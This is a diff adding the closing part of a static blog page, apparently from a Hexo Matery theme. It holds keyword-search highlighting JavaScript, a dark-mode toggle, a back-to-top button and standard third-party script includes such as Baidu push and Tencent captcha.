+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+        
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+    <script type="text/javascript" color="0,0,255"
+        pointColor="0,0,255" opacity='0.7'
+        zIndex="-1" count="99"
+        src="/libs/background/canvas-nest.js"></script>
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
